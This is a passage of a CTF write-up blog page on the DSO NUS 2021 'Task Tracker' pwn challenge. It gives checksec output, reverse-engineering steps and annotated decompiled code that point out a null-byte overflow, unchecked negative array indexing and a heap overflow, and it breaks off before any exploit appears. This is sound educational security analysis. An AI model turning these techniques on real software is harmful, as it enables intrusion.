<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>DSO NUS 2021 CTF - Task Tracker (Pwn) | Enigmatrix</title>
    <meta name="generator" content="VuePress 1.8.2">
    <link rel="icon" href="/favicon.png">
    <meta name="description" content="When you have a statically linked binary with too many vulns">
    
    <link rel="preload" href="/assets/css/0.styles.d518fe33.css" as="style"><link rel="preload" href="/assets/js/app.c3d8ca62.js" as="script"><link rel="preload" href="/assets/js/6.3722ae10.js" as="script"><link rel="preload" href="/assets/js/3.8eed2eee.js" as="script"><link rel="preload" href="/assets/js/10.4b595a00.js" as="script"><link rel="prefetch" href="/assets/js/11.fb3a3275.js"><link rel="prefetch" href="/assets/js/12.e01f3506.js"><link rel="prefetch" href="/assets/js/13.c3ff054c.js"><link rel="prefetch" href="/assets/js/14.cbc77de8.js"><link rel="prefetch" href="/assets/js/15.12185247.js"><link rel="prefetch" href="/assets/js/16.ff9fde79.js"><link rel="prefetch" href="/assets/js/17.c2e9ae64.js"><link rel="prefetch" href="/assets/js/18.b31259ba.js"><link rel="prefetch" href="/assets/js/19.9ea997bf.js"><link rel="prefetch" href="/assets/js/20.00359bb3.js"><link rel="prefetch" href="/assets/js/21.1cc8c958.js"><link rel="prefetch" href="/assets/js/4.5f78fef9.js"><link rel="prefetch" href="/assets/js/5.98a0c27e.js"><link rel="prefetch" href="/assets/js/7.ff10d07c.js"><link rel="prefetch" href="/assets/js/8.e129988e.js"><link rel="prefetch" href="/assets/js/9.868a262b.js"><link rel="prefetch" href="/assets/js/vuejs-paginate.92caeb0c.js">
    <link rel="stylesheet" href="/assets/css/0.styles.d518fe33.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div id="root" class="theme-container no-sidebar" data-v-4533fcd8><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">Enigmatrix</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/blog/" class="nav-link router-link-active">
  Blog
</a></div><div class="nav-item"><a href="/tags/" class="nav-link">
  Tags
</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/blog/" class="nav-link router-link-active">
  Blog
</a></div><div class="nav-item"><a href="/tags/" class="nav-link">
  Tags
</a></div> <!----></nav>  <!----> </aside> <main class="page"><div id="post-header" class="theme-default-content" data-v-4533fcd8><div id="date" data-v-4533fcd8>06 March 2021, 06:30 pm</div> <h1 id="title" data-v-4533fcd8>DSO NUS 2021 CTF - Task Tracker (Pwn)</h1> <span id="description" data-v-4533fcd8>When you have a statically linked binary with too many vulns</span> <div id="tags" data-v-4533fcd8><a href="/tags/ctf" class="tag" data-v-4533fcd8>ctf</a><a href="/tags/dso-nus-ctf" class="tag" data-v-4533fcd8>dso-nus-ctf</a><a href="/tags/pwn" class="tag" data-v-4533fcd8>pwn</a></div></div> <div class="theme-default-content content__default"><p>Task Tracker was the challenge with the highest number of points in the <code>pwn</code> category at <strong>400 pts</strong>. It was a challenge that took a while for me to solve, despite its obvious vulnerabilities.</p> <h2 id="basic-information"><a href="#basic-information" class="header-anchor">#</a> Basic Information</h2> <p>Let's get some file information from it first (using <code>file</code> and <a href="https://docs.pwntools.com/en/stable/commandline.html#pwn-checksec" target="_blank" rel="noopener noreferrer"><code>checksec</code><span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>):</p> <div class="language-sh extra-class"><pre class="language-sh"><code>❯ <span class="token function">file</span> tasktracker
tasktracker: ELF <span class="token number">64</span>-bit LSB executable, x86-64, version <span class="token number">1</span> <span class="token punctuation">(</span>GNU/Linux<span class="token punctuation">)</span>, statically linked, <span class="token keyword">for</span> GNU/Linux <span class="token number">2.6</span>.32, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>40ae7a4291500370ce2158854195477ecf9875b3, stripped
❯ checksec tasktracker
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'tasktracker'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
</code></pre></div><p>We have a statically linked binary, which means that all external library functions are part of the binary itself. Symbols are stripped, which means that we do not know the name of any functions. Since the binary is statically linked, even the libc functions like <code>fopen</code>, <code>printf</code>, <code>read</code> etc have their names stripped.</p> <p>In terms of protections, we have <code>partial RELRO</code>, which means that we can still overwrite the <code>GOT</code> section, <code>No canary found</code>, which means that we have no canary check for overflowing the stack, and <code>No PIE</code>, which means that functions in the binary are not shuffled around during execution. Since our binary is statically linked, this also means that functions like <code>system</code> and other interesting functions are at a fixed location in memory.</p> <p>We already a lot of protections disabled, so let's go find some holes to whack.</p> <h2 id="finding-vulnerabilities"><a href="#finding-vulnerabilities" class="header-anchor">#</a> Finding vulnerabilities</h2> <p>I used <a href="https://ghidra-sre.org/" target="_blank" rel="noopener noreferrer">Ghidra<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> for analysis and reversing of the binary. Opening up the file in Ghidra shows us a lot of functions with the default labelling scheme:</p> <p><img src="/assets/img/initial_functions.fdd6c148.png" alt="initial_functions.png"></p> <p>That is the effect of stripping the binary. You will also see <em>a lot</em> of functions, which is due to the library being statically linked and including external libaries like <code>libc</code>.</p> <h3 id="finding-nemo-main"><a href="#finding-nemo-main" class="header-anchor">#</a> Finding <s>nemo</s> <code>main</code></h3> <p>It would seem very difficult to find <code>main</code> at first, but the easiest way is to find the binary's entrypoint (<code>_entry</code>), then start from there.</p> <p><img src="/assets/img/entry.93163aa2.png" alt="entry.png"></p> <p>That highlighted function in <code>_entry</code> is almost always <a href="https://refspecs.linuxbase.org/LSB_3.1.0/LSB-generic/LSB-generic/baselib---libc-start-main-.html" target="_blank" rel="noopener noreferrer">__libc_start_main<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>.</p> <div class="language-c extra-class"><pre class="language-c"><code><span class="token keyword">int</span> <span class="token function">__libc_start_main</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">(</span>main<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> <span class="token operator">*</span> ubp_av<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>init<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>fini<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>rtld_fini<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span> stack_end<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>The first parameter (in the <code>RDI</code> register), is <code>main</code>, but if you see invocation of the function, there are a lot of parameters passed in.
The actual <code>main</code> function is the first function that is passed in, which is <code>FUN_00400e48</code>. For tips on better function decompilation, see <a href="#function-signature-mismatch-e-g-libc-start-main">below</a>.</p> <p>For the rest of this writeup, I will use my annotated code.</p> <h3 id="main"><a href="#main" class="header-anchor">#</a> main</h3> <div class="language-c extra-class"><pre class="language-c"><code><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">void</span><span class="token operator">*</span> commands <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  commands<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> welcome<span class="token punctuation">;</span>
  commands<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> show_tasks<span class="token punctuation">;</span>
  commands<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> add_task<span class="token punctuation">;</span>
  commands<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> change_task<span class="token punctuation">;</span>
  commands<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> activate_comm<span class="token punctuation">;</span>
  commands<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> emergency_meeting<span class="token punctuation">;</span>

  <span class="token punctuation">(</span>commands<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">do</span> <span class="token punctuation">{</span>
    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> opt <span class="token operator">=</span> <span class="token function">stroul_base10</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">switch</span><span class="token punctuation">(</span>opt<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">default</span><span class="token operator">:</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Invalid Option. Not sure if you have butter fingers, but you deserve to be voted outanyways.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
      <span class="token punctuation">(</span><span class="token operator">*</span>commands<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
      <span class="token punctuation">(</span><span class="token operator">*</span>commands<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>
      <span class="token punctuation">(</span><span class="token operator">*</span>commands<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>
      <span class="token punctuation">(</span><span class="token operator">*</span>commands<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>
      <span class="token punctuation">(</span><span class="token operator">*</span>commands<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span> <span class="token keyword">while</span><span class="token punctuation">(</span>true<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>Standard menu-based <code>main</code>. But do note that the options (the <code>command</code> array) available to us are invoked by the means of a <code>malloc</code>'ed array. Seems a bit suspicious? 😃</p> <div class="custom-block tip"><p class="custom-block-title">NOTE</p> <p>There are other writeups that explore exploitation using this as a tool (House of Force), however my method is different</p></div> <h3 id="show-tasks"><a href="#show-tasks" class="header-anchor">#</a> show_tasks</h3> <div class="language-c extra-class"><pre class="language-c"><code><span class="token keyword">void</span> <span class="token function">show_tasks</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span>
  
  <span class="token keyword">if</span> <span class="token punctuation">(</span>taskcount <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Are you doing your tasks?&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
    i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">50</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>tasks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Task Number: %d  Task Name : %s&quot;</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> tasks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>The <code>show_task</code> method is innocuous, but here we get a introduction to our main player: <code>tasks</code>. The definition is as below:</p> <div class="language-c extra-class"><pre class="language-c"><code><span class="token keyword">struct</span> <span class="token class-name">task</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span> len<span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> name<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">struct</span> <span class="token class-name">task</span> tasks<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//global</span>
<span class="token keyword">int</span> taskcount<span class="token punctuation">;</span> <span class="token comment">//global</span>
</code></pre></div><h3 id="add-task"><a href="#add-task" class="header-anchor">#</a> add_task</h3> <div class="language-c extra-class"><pre class="language-c"><code><span class="token keyword">void</span> <span class="token function">add_task</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">int</span> len<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span>
  ulong read_sz<span class="token punctuation">;</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span>
  byte buf <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  
  <span class="token keyword">if</span> <span class="token punctuation">(</span>taskcount <span class="token operator">&lt;</span> <span class="token number">50</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Please enter the length of task name:&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    len <span class="token operator">=</span> <span class="token function">stroul_base10</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Are you an imposter?&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
      i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">50</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>tasks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          tasks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>len <span class="token operator">=</span> len<span class="token punctuation">;</span>
          name <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
          tasks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Please enter the name of task:&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          read_sz <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tasks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
          tasks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>read_sz<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span> <span class="token comment">// BUG: null byte overflow</span>
          taskcount <span class="token operator">=</span> taskcount <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;All tasks have been tracked. Call the Emergency Meeting!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p>This method allows us to create a task, which takes up space in the global <code>tasks[50]</code> array. We can allocate an user-selectable sized length of memory for the task name, and the length of this name is stored as <code>len</code> for the task. We also see our first bug, which is writing a null byte past the end of the task name if the length of the name is allocated equal to the length of the name requested. This can be exploited via House of <a href="https://heap-exploitation.dhavalkapil.com/attacks/house_of_einherjar" target="_blank" rel="noopener noreferrer">Einherjar<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>, but we have no calls to <code>free</code> so nevermind.</p> <h3 id="change-task"><a href="#change-task" class="header-anchor">#</a> change_task</h3> <div class="language-c extra-class"><div class="highlight-lines"><br><br><br><br><br><br><br><br><br><br><br><br><br><div class="highlighted"> </div><br><br><br><br><br><br><div class="highlighted"> </div><br><br><div class="highlighted"> </div><br><br><br><br></div><pre class="language-c"><code><span class="token keyword">void</span> <span class="token function">change_task</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">int</span> idx<span class="token punctuation">;</span>
  <span class="token keyword">int</span> len<span class="token punctuation">;</span>
  ulong read_sz<span class="token punctuation">;</span>
  byte idx_buf <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  byte buf <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  
  <span class="token keyword">if</span> <span class="token punctuation">(</span>taskcount <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Are you doing your tasks?&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Please enter the index of the task you want to change:&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>idx_buf<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    idx <span class="token operator">=</span> <span class="token function">stroul_base10</span><span class="token punctuation">(</span>idx_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>tasks<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">.</span>name <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;That is what an imposter would say.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Enter the length of task name:&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      len <span class="token operator">=</span> <span class="token function">stroul_base10</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Enter the new task name:&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      read_sz <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tasks<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
      tasks<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>read_sz<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p>Here we see 3 bugs, 2 of which are usable for our exploitation. The third line highlighted is the same bug as before, which we cannot exploit. The first two bugs are as follows:</p> <ol><li>Unchecked array access
<ul><li>We see that there is no checking on the index of the task we want to change, so we can we can go past the <code>tasks[50]</code> array. Since we use <code>strtoul</code>, we can use negative indices as well.</li></ul></li> <li>Overflow into heap chunk
<ul><li>Despite the length of the task name being stored inside the <code>task</code> struct as <code>task.len</code>, it is ignored and instead unchecked user input is used as the length of name, so we can write past the memory region of <code>task.name</code> and into other heap chunks.</li></ul></li></ol> <p>For my exploit, I only used vulnerability (1) to exploit the binary.</p> <h3 id="activate-comm-emergency-meeting"><a href="#activate-comm-emergency-meeting" class="header-anchor">#</a> activate_comm &amp; emergency_meeting</h3> <div class="language-c extra-class"><pre class="language-c"><code><span class="token keyword">void</span> <span class="token function">activate_comm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;-. .. -.-. .&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;- .-. -.-- --..--&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;.. -- .--. --- ... - . .-. .-.-.-&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;-... ..- -&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;..&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;-.-. .- -.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;- . .-.. .-..&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;-.-- --- ..-&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
